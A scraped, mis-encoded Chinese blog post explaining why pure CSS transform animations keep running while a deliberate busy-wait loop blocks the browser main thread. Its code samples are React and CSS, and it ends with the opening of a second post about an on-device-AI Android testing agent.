<p>æˆ‘ä»¬æ„å»ºäº†ä¸€ä¸ªç®€å•çš„ React åº”ç”¨ã€‚æ ¸å¿ƒé€»è¾‘åœ¨äºä¸€ä¸ªåä¸ºâ€œBlock Main Threadâ€çš„æŒ‰é’®ã€‚ç‚¹å‡»å®ƒï¼Œä¼šè§¦å‘ä¸€æ®µè€—æ—¶ 3 ç§’çš„åŒæ­¥ <code>while</code> å¾ªç¯ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ¨¡æ‹Ÿä¸»çº¿ç¨‹é˜»å¡</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleBlock</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-title function_">setIsBlocking</span>(<span class="hljs-literal">true</span>);
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> start = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
    <span class="hljs-keyword">const</span> duration = <span class="hljs-number">3000</span>; 
    <span class="hljs-comment">// ğŸ’€ æ­»å¾ªç¯ï¼šå½»åº•éœ¸å ä¸»çº¿ç¨‹ 3000ms</span>
    <span class="hljs-keyword">while</span> (<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - start &lt; duration) {
      <span class="hljs-comment">// Blocking main thread</span>
    }
    <span class="hljs-title function_">setIsBlocking</span>(<span class="hljs-literal">false</span>);
  }, <span class="hljs-number">100</span>);
};

</code></pre>
<p>åœ¨è¿™ 3 ç§’å†…ï¼Œæµè§ˆå™¨çš„ä¸»çº¿ç¨‹ï¼ˆMain Threadï¼‰è¢«å®Œå…¨æŒ‚èµ·ã€‚å®ƒæ— æ³•å“åº”ç‚¹å‡»ã€æ— æ³•æ»šåŠ¨é¡µé¢ã€æ— æ³•æ‰§è¡Œå…¶ä»–çš„ JavaScript ä»£ç ã€‚</p>
<p>ä½†åœ¨é¡µé¢ä¸Šï¼Œæˆ‘ä»¬æ”¾ç½®äº†å››ä¸ªæ­£åœ¨è¿è¡Œçš„åŠ¨ç”»æ–¹å—ï¼ˆCase A, B, C, Dï¼‰ã€‚å½“æˆ‘ä»¬ç‚¹å‡»é˜»å¡æŒ‰é’®æ—¶ï¼Œå¥‡æ€ªçš„ç°è±¡å‘ç”Ÿäº†ï¼š</p>
<ol>
<li><strong>æ–¹å— Cï¼ˆJS é©±åŠ¨ï¼‰</strong>ï¼šç«‹å³åœæ­¢ã€‚</li>
<li><strong>æ–¹å— Dï¼ˆMargin åŠ¨ç”»ï¼‰</strong>ï¼šç«‹å³åœæ­¢ã€‚</li>
<li><strong>æ–¹å— Bï¼ˆTransform + Widthï¼‰</strong>ï¼šç«‹å³åœæ­¢ï¼ˆæˆ–å˜å¾—æåº¦å¡é¡¿ï¼‰ã€‚</li>
<li><strong>æ–¹å— Aï¼ˆçº¯ Transformï¼‰</strong>ï¼š<strong>å±…ç„¶è¿˜åœ¨æµç•…æ—‹è½¬ï¼</strong></li>
</ol>
<p>ä¸ºä»€ä¹ˆæ–¹å— A èƒ½çªç ´ JS çš„å°é”ï¼Ÿ</p>
<h2 data-id="heading-1">å¿…é¡»äº†è§£çš„ä¸¤ä½ä¸»è§’ï¼šä¸»çº¿ç¨‹ vs. åˆæˆçº¿ç¨‹</h2>
<p>è¦ç†è§£è¿™ä¸ªç°è±¡ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“æµè§ˆå™¨å†…éƒ¨ä¹Ÿæ˜¯â€œå¤šçº¿ç¨‹â€å·¥ä½œçš„ã€‚å…¶ä¸­æœ€é‡è¦çš„ä¸¤ä¸ªçº¿ç¨‹æ˜¯ï¼š</p>
<ol>
<li><strong>ä¸»çº¿ç¨‹ (Main Thread)</strong>ï¼š</li>
</ol>
<ul>
<li>å®ƒæ˜¯æœ€å¿™ç¢Œçš„ã€‚è´Ÿè´£è¿è¡Œ JavaScriptã€è®¡ç®— HTML å…ƒç´ çš„æ ·å¼ï¼ˆStyleï¼‰ã€è®¡ç®—é¡µé¢å¸ƒå±€ï¼ˆLayoutï¼‰ã€ç»˜åˆ¶å›¾å±‚å†…å®¹ï¼ˆPaintï¼‰ã€‚</li>
<li><strong>å®ƒæ˜¯â€œå•çº¿ç¨‹â€çš„</strong>ã€‚å¦‚æœä½ å†™äº†ä¸€ä¸ªæ­»å¾ªç¯ï¼Œå®ƒå°±æ²¡ç©ºå»ç®—å¸ƒå±€ï¼Œä¹Ÿæ²¡ç©ºç»˜å›¾ã€‚</li>
</ul>
<ol start="2">
<li><strong>åˆæˆçº¿ç¨‹ (Compositor Thread)</strong>ï¼š</li>
</ol>
<ul>
<li>å®ƒæ˜¯ä¸»çº¿ç¨‹çš„åŠ©æ‰‹ï¼Œé€šå¸¸ç”± GPU ååŠ©ã€‚</li>
<li>å®ƒçš„å·¥ä½œæ˜¯å°†ä¸»çº¿ç¨‹ç”»å¥½çš„å„ä¸ªå›¾å±‚ï¼ˆLayersï¼‰æ¥æ”¶è¿‡æ¥ï¼Œè¿›è¡Œåˆæˆï¼ˆCompositeï¼‰ï¼Œå¹¶æœ€ç»ˆæ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚</li>
<li><strong>é‡ç‚¹</strong>ï¼šå®ƒå¯ä»¥ç‹¬ç«‹äºä¸»çº¿ç¨‹å¤„ç†ä¸€äº›ç‰¹å®šçš„è§†è§‰å˜æ¢ï¼Œæ¯”å¦‚<strong>ä½ç§»ï¼ˆTranslateï¼‰ã€æ—‹è½¬ï¼ˆRotateï¼‰ã€ç¼©æ”¾ï¼ˆScaleï¼‰å’Œé€æ˜åº¦ï¼ˆOpacityï¼‰</strong>ã€‚</li>
</ul>
<h2 data-id="heading-2">æ¡ˆä»¶åˆ†æ</h2>
<p>è®©æˆ‘ä»¬ç»“åˆä»£ç é€ä¸€åˆ†æå››ä¸ªæ–¹å—çš„å‘½è¿ã€‚</p>
<h3 data-id="heading-3">å—å®³è€…ä¸€ï¼šCase C (JavaScript é©±åŠ¨)</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// JS é©±åŠ¨çš„åŠ¨ç”»é€»è¾‘</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">animateJS</span> = (<span class="hljs-params">time: <span class="hljs-built_in">number</span></span>) =&gt; {
  <span class="hljs-comment">// ...è®¡ç®—ä½ç½® x ...</span>
  <span class="hljs-keyword">if</span> (jsBoxRef.<span class="hljs-property">current</span>) {
    jsBoxRef.<span class="hljs-property">current</span>.<span class="hljs-property">style</span>.<span class="hljs-property">transform</span> = <span class="hljs-string">`translateX(<span class="hljs-subst">${x}</span>px)`</span>;
  }
  requestRef.<span class="hljs-property">current</span> = <span class="hljs-title function_">requestAnimationFrame</span>(animateJS);
};

</code></pre>
<p><strong>æ­»å› </strong>ï¼šä¾èµ–ä¸»çº¿ç¨‹ã€‚
<code>requestAnimationFrame</code> æ˜¯è¯·æ±‚æµè§ˆå™¨åœ¨ä¸‹ä¸€æ¬¡é‡ç»˜å‰è°ƒç”¨æŒ‡å®šçš„å›è°ƒå‡½æ•°ã€‚è¿™ä¸ªå›è°ƒå‡½æ•°æ˜¯åœ¨<strong>ä¸»çº¿ç¨‹</strong>ä¸Šæ‰§è¡Œçš„ã€‚å½“ä¸»çº¿ç¨‹è¢« <code>while</code> å¾ªç¯å¡æ­»æ—¶ï¼Œ<code>animateJS</code> å‡½æ•°æ ¹æœ¬å¾—ä¸åˆ°æ‰§è¡Œæœºä¼šã€‚æ‰€ä»¥åŠ¨ç”»ç¬é—´å†»ç»“ã€‚</p>
<h3 data-id="heading-4">å—å®³è€…äºŒï¼šCase D (Layout å±æ€§ - Margin)</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* æ”¹å˜ margin-left */</span>
<span class="hljs-keyword">@keyframes</span> pure-margin {
  <span class="hljs-number">0%</span> { <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">0</span>; }
  <span class="hljs-number">50%</span> { <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">150px</span>; } <span class="hljs-comment">/* è§¦å‘ Layout */</span>
  <span class="hljs-number">100%</span> { <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">0</span>; }
}

</code></pre>
<p><strong>æ­»å› </strong>ï¼šè§¦å‘é‡æ’ï¼ˆReflow/Layoutï¼‰ã€‚
<code>margin</code> å±æ€§å†³å®šäº†å…ƒç´ åœ¨æ–‡æ¡£æµä¸­çš„ä½ç½®ã€‚ä¿®æ”¹å®ƒä¼šå½±å“å‘¨å›´å…ƒç´ çš„æ’ç‰ˆã€‚æµè§ˆå™¨å¿…é¡»é‡æ–°è®¡ç®—å¸ƒå±€ï¼ˆLayout é˜¶æ®µï¼‰ï¼Œè¿™ä¸ªè®¡ç®—è¿‡ç¨‹å¿…é¡»åœ¨<strong>ä¸»çº¿ç¨‹</strong>å®Œæˆã€‚ä¸»çº¿ç¨‹å¿™ç€è·‘æ­»å¾ªç¯ï¼Œæ²¡ç©ºç®—å¸ƒå±€ï¼Œæ‰€ä»¥åŠ¨ç”»åœæ­¢ã€‚</p>
<h3 data-id="heading-5">å—å®³è€…ä¸‰ï¼šCase B (æ··åˆå±æ€§ - Transform + Width)</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-keyword">@keyframes</span> mixed-transform {
  <span class="hljs-number">0%</span> { <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">0deg</span>); <span class="hljs-attribute">width</span>: <span class="hljs-number">48px</span>; }
  <span class="hljs-number">50%</span> { <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">180deg</span>); <span class="hljs-attribute">width</span>: <span class="hljs-number">120px</span>; } <span class="hljs-comment">/* Width è§¦å‘ Layout */</span>
  <span class="hljs-number">100%</span> { <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">360deg</span>); <span class="hljs-attribute">width</span>: <span class="hljs-number">48px</span>; }
}

</code></pre>
<p><strong>æ­»å› </strong>ï¼šè¢«é˜Ÿå‹æ‹–ç´¯ã€‚
è™½ç„¶å®ƒåŒ…å« <code>transform</code>ï¼ˆç”±åˆæˆçº¿ç¨‹å¤„ç†ï¼‰ï¼Œä½†å®ƒåŒæ—¶ä¹Ÿæ”¹å˜äº† <code>width</code>ã€‚<code>width</code> çš„æ”¹å˜ä¼šè§¦å‘ Layoutã€‚æµè§ˆå™¨é€šå¸¸éœ€è¦æ¯ä¸€å¸§éƒ½ç¡®è®¤ Layout çš„ç»“æœï¼Œæ‰èƒ½è¿›è¡Œåç»­çš„ç»˜åˆ¶å’Œåˆæˆã€‚å› ä¸º <code>width</code> çš„è®¡ç®—è¢«ä¸»çº¿ç¨‹é˜»å¡äº†ï¼Œæ•´ä¸ªåŠ¨ç”»å¸§çš„æäº¤è¢«å»¶åï¼Œå¯¼è‡´å³ä½¿æ˜¯æ—‹è½¬éƒ¨åˆ†ä¹Ÿè¢«è¿«åœæ­¢ã€‚</p>
<h3 data-id="heading-6">å¹¸å­˜è€…ï¼šCase A (çº¯ Transform)</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* ä»…æ”¹å˜ transform */</span>
<span class="hljs-keyword">@keyframes</span> pure-transform {
  <span class="hljs-selector-tag">from</span> { <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">0deg</span>); }
  <span class="hljs-selector-tag">to</span> { <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">360deg</span>); }
}

</code></pre>
<p><strong>ç”Ÿè¿˜åŸå› </strong>ï¼š<strong>è„±ç¦»ä¸»çº¿ç¨‹ï¼ˆOff Main Threadï¼‰</strong>ã€‚
è¿™æ˜¯æ€§èƒ½ä¼˜åŒ–çš„æ ¸å¿ƒé­”æ³•ã€‚</p>
<ol>
<li>å½“æµè§ˆå™¨åˆ†æè¿™ä¸ª CSS åŠ¨ç”»æ—¶ï¼Œå®ƒå‘ç°è¿™ä¸ªåŠ¨ç”»<strong>åª</strong>æ¶‰åŠ <code>transform</code>ã€‚</li>
<li><code>transform</code> ä¸ä¼šæ”¹å˜å…ƒç´ çš„å¸ƒå±€ï¼ˆLayoutï¼‰ï¼Œä¹Ÿä¸éœ€è¦é‡æ–°ç»˜åˆ¶å†…å®¹ï¼ˆPaintï¼‰ï¼Œå®ƒåªéœ€è¦æŠŠç°æœ‰çš„å›¾å±‚æ‹¿æ¥æ—‹è½¬ä¸€ä¸‹ã€‚</li>
<li>ä¸»çº¿ç¨‹ä¼šå°†è¿™ä¸ªåŠ¨ç”»ä»»åŠ¡åŠå…¶å›¾å±‚ä¿¡æ¯ç›´æ¥<strong>æäº¤ï¼ˆCommitï¼‰ç»™åˆæˆçº¿ç¨‹</strong>ã€‚</li>
<li><strong>åˆæˆçº¿ç¨‹</strong>è¯´ï¼šâ€œæ”¶åˆ°ï¼Œå‰©ä¸‹çš„äº¤ç»™æˆ‘ã€‚â€</li>
</ol>
<p>æ­¤æ—¶ï¼Œæ— è®ºä¸»çº¿ç¨‹æ˜¯åœ¨è·‘æ­»å¾ªç¯ï¼Œè¿˜æ˜¯åœ¨è¿›è¡Œå¤æ‚çš„è®¡ç®—ï¼Œ<strong>åˆæˆçº¿ç¨‹</strong>éƒ½åœ¨ç‹¬ç«‹å·¥ä½œã€‚å®ƒä¸æ–­åœ°æŒ‡ç¤º GPU æ—‹è½¬é‚£ä¸ªå›¾å±‚ï¼Œå¹¶æ›´æ–°å±å¹•ã€‚</p>
<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆå³ä¾¿ä½ çš„ JS å¡æ­»äº†ï¼ŒLoading è½¬åœˆåŠ¨ç”»ï¼ˆå¦‚æœå†™å¾—å¯¹ï¼‰ä¾ç„¶åœ¨è½¬ã€‚</p>
<h2 data-id="heading-7">æ€»ç»“ä¸æŠ€æœ¯å¯ç¤º</h2>
<p>é€šè¿‡è¿™ä¸ª Demoï¼Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºæ˜ç¡®çš„æ€§èƒ½ä¼˜åŒ–åŸåˆ™ï¼š</p>
<ol>
<li><strong>é¿å…ä¸»çº¿ç¨‹é˜»å¡</strong>ï¼š</li>
</ol>
<ul>
<li>é•¿è€—æ—¶çš„è®¡ç®—ä»»åŠ¡ï¼ˆå¦‚å¤§æ•°ç»„å¤„ç†ã€å¤æ‚ç®—æ³•ï¼‰ä¸åº”åœ¨ UI æ¸²æŸ“è·¯å¾„ï¼ˆReact Render, Event Handlersï¼‰ä¸­åŒæ­¥æ‰§è¡Œã€‚</li>
<li>è€ƒè™‘ä½¿ç”¨ <code>Web Worker</code> å°†è®¡ç®—ä»»åŠ¡ç§»å‡ºä¸»çº¿ç¨‹ã€‚</li>
<li>åˆ©ç”¨ <code>React Concurrent Mode</code> æˆ– <code>Time Slicing</code> åˆ‡åˆ†ä»»åŠ¡ã€‚</li>
</ul>
<ol start="2">
<li><strong>åŠ¨ç”»æ€§èƒ½é»„é‡‘æ³•åˆ™</strong>ï¼š</li>
</ol>
<ul>
<li>**åšæŒä½¿ç”¨ <code>transform</code> å’Œ <code>opacity**</code>ã€‚åªæœ‰è¿™ä¸¤ä¸ªå±æ€§å¯ä»¥ä¿è¯ 100% åœ¨åˆæˆçº¿ç¨‹è¿è¡Œï¼Œå®Œå…¨ä¸å— JS é˜»å¡å½±å“ã€‚</li>
<li><strong>é¿å…åŠ¨ç”»åŒ–å¸ƒå±€å±æ€§</strong>ï¼ˆå¦‚ <code>width</code>, <code>height</code>, <code>margin</code>, <code>padding</code>, <code>left</code>, <code>top</code>ï¼‰ã€‚è¿™äº›å±æ€§ä¸ä»…å¼€é”€å¤§ï¼ˆè§¦å‘ Layoutï¼‰ï¼Œè€Œä¸”ä¸€æ—¦ä¸»çº¿ç¨‹å¡é¡¿ï¼ŒåŠ¨ç”»å°±ä¼šæ‰å¸§ã€‚</li>
<li><strong>è­¦æƒ•â€œæ··åˆæ±¡æŸ“â€</strong>ï¼šä¸è¦åœ¨ä¸€ä¸ª <code>@keyframes</code> ä¸­åŒæ—¶åŒ…å«åˆæˆå±æ€§ï¼ˆtransformï¼‰å’Œå¸ƒå±€å±æ€§ï¼ˆwidthï¼‰ï¼Œå¦åˆ™é«˜æ€§èƒ½çš„å±æ€§ä¹Ÿä¼šè¢«æ‹–ç´¯ã€‚</li>
</ul>
<h2 data-id="heading-8">ä¸‹ä¸€æ­¥è¡ŒåŠ¨</h2>
<p>æ£€æŸ¥ä½ é¡¹ç›®ä¸­çš„ Loading ç»„ä»¶æˆ–è¿‡æ¸¡åŠ¨ç”»ã€‚ç¡®ä¿å®ƒä»¬æ˜¯åŸºäº CSS <code>transform</code> å®ç°çš„ï¼Œè€Œä¸æ˜¯ JavaScript æˆ– <code>margin</code>ã€‚è¿™æ ·ï¼Œå³ä½¿ä½ çš„åç«¯æ¥å£è¿”å›æ…¢ï¼Œæˆ–è€…å‰ç«¯æ•°æ®å¤„ç†å¡é¡¿ï¼Œç”¨æˆ·ä¾ç„¶èƒ½çœ‹åˆ°ä¸€ä¸ªä¸èˆ¬é¡ºæ»‘çš„åŠ è½½æŒ‡ç¤ºå™¨ï¼Œä»è€Œå‡å°‘â€œåº”ç”¨å·²å´©æºƒâ€çš„é”™è§‰ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Monkey-AIï¼šåŸºäºç«¯ä¾§ AI çš„ Android è‡ªåŠ¨åŒ–æµ‹è¯• Agent]]></title>    <link>https://juejin.cn/post/7602559134575099940</link>    <guid>https://juejin.cn/post/7602559134575099940</guid>    <pubDate>2026-02-04T03:48:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602559134575099940" data-draft-id="7602512064977027135" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Monkey-AIï¼šåŸºäºç«¯ä¾§ AI çš„ Android è‡ªåŠ¨åŒ–æµ‹è¯• Agent"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,æœºå™¨å­¦ä¹ ,Android"/> <meta itemprop="datePublished" content="2026-02-04T03:48:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æœ±æ¶›çš„è‡ªä¹ å®¤"/> <meta itemprop="url" content="https://juejin.cn/user/2119514149637032"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Monkey-AIï¼šåŸºäºç«¯ä¾§ AI çš„ Android è‡ªåŠ¨åŒ–æµ‹è¯• Agent
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2119514149637032/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æœ±æ¶›çš„è‡ªä¹ å®¤
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T03:48:53.000Z" title="Wed Feb 04 2026 03:48:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨è¿™ä¸ª AI æŠ€æœ¯<strong>ç‹‚é£™</strong>çš„æ—¶ä»£ï¼Œä» ChatGPT åˆ° Geminiã€Qwenã€Deepseekï¼Œæ¯éš”å‡ å¤©å°±ä¼šæœ‰ä¸€ä¸ªå¤§æ–°é—»ã€‚äººå·¥æ™ºèƒ½æ­£åœ¨é‡å¡‘æ¯ä¸€ä¸ªè¡Œä¸šã€‚</p>
<p>å¯¹äº Android å¼€å‘è€…è€Œè¨€ï¼Œè‡ªåŠ¨åŒ–æµ‹è¯•ï¼Œä¸€ç›´æ˜¯ä¸ªå¾ˆé¸¡è‚‹çš„ä»»åŠ¡ï¼šå†™å§ï¼Œå«Œéº»çƒ¦ï¼Œè€Œä¸”ç»å¸¸è¦è·Ÿéšè¿­ä»£ç»´æŠ¤ã€‚ä¸å†™å§ï¼Ÿå¥½åƒåˆæ˜¾å¾—ä¸ä¸“ä¸šï¼Ÿå®¹æ˜“å¿ƒæ…Œï¼Ÿ</p>
<p>ä¹Ÿè®¸ä½ å¬è¯´è¿‡ Espresso æˆ– Appium èƒ½åšè‡ªåŠ¨åŒ–æµ‹è¯•ï¼Œä½†ä»ç„¶é€ƒä¸äº†å†™æµ‹è¯•è„šæœ¬çš„å‘½è¿ã€‚è¿™æ ·çš„é—®é¢˜æœ‰å¾ˆå¤šè§£æ³•ï¼Œæ¯”å¦‚ï¼Œè®© AI æ¥å†™æµ‹è¯•ã€‚</p>
<p>è€Œæˆ‘æƒ³åˆ°äº†å¦ä¸€ä¸ªæ€è·¯ï¼Œé‚£å°±æ˜¯ï¼š<strong>è®© AI å¸®æˆ‘åšæµ‹è¯•</strong>ï¼</p>
<p>æœ‰äº†è¿™ä¸ªæƒ³æ³•ï¼Œæˆ‘å°±å¼€å§‹å†™ä»£ç äº†ã€‚å®é™…æ“ä½œä¸‹æ¥ï¼Œé‡åˆ°äº†ä¸å°‘é—®é¢˜ï¼Œæˆ‘æ…¢æ…¢é€šè¿‡åšå®¢æ¥è®°å½•ã€‚</p>
<p>é¦–å…ˆï¼Œäº‘ç«¯ AI API è‚¯å®šæ˜¯ä¸èƒ½ç”¨çš„ï¼Œå› ä¸ºä¼šç‰¹åˆ«çƒ§é’±ã€‚æœ€å¥½èƒ½è®© AI è·‘åœ¨æˆ‘ä»¬è‡ªå·±çš„ç”µè„‘ä¸Šï¼Œè¿™æ ·ä¸€æ¥è‡ªåŠ¨åŒ–æµ‹è¯•çš„æˆæœ¬å°±å¯ä»¥<code>å¿½ç•¥ä¸è®¡</code>äº†ã€‚å¹¸è¿çš„æ˜¯ï¼Œéšç€ Gemmaã€Qwen ç­‰å¼€æºæ¨¡å‹çš„æŒç»­ä¼˜åŒ–ï¼Œ<code>ç«¯ä¾§æ¨¡å‹çš„æ™ºèƒ½ç¨‹åº¦å·²ç»è¶³ä»¥èƒœä»»è¿™äº›ç®€å•çš„é€»è¾‘ä»»åŠ¡ã€‚</code></p>
<p>è§£å†³äº†ç«¯ä¾§ AI è¿è¡Œçš„é—®é¢˜åï¼Œå‰©ä¸‹çš„ OCRã€OpenCV ç›¸å…³çš„æŠ€æœ¯å°±ä¸æ˜¯é—®é¢˜äº†ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œè¯·å¤§å®¶çœ‹çœ‹æˆ‘é—²æš‡æ—¶é—´å†™çš„è¿™ä¸ªé¡¹ç›®ï¼šåŸºäºç«¯ä¾§ AI çš„ Android è‡ªåŠ¨åŒ–æµ‹è¯• Agent é¡¹ç›®â€”â€”<strong>Monkey-AI</strong>ã€‚</p>
<h2 data-id="heading-0">ä»€ä¹ˆæ˜¯ Monkey-AIï¼Ÿ</h2>
<p>ä½œä¸º Android ç¨‹åºå‘˜ï¼ŒMonkey å¤šå¤šå°‘å°‘éƒ½åº”è¯¥å¬è¯´è¿‡å§ï¼Ÿ<code>Monkey-AI</code> é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯ä¸€ä¸ªè¿è¡Œåœ¨æ¡Œé¢ç”µè„‘ï¼ˆ MacOS/Windowsï¼‰çš„ Android è‡ªåŠ¨åŒ–æµ‹è¯• Agentã€‚å®ƒä¸ä¾èµ–æ˜‚è´µçš„äº‘ç«¯ APIï¼Œå®Œå…¨åŸºäºæœ¬åœ°è¿è¡Œçš„å¼€æºå¤§æ¨¡å‹æ¥é©±åŠ¨ã€‚</p>
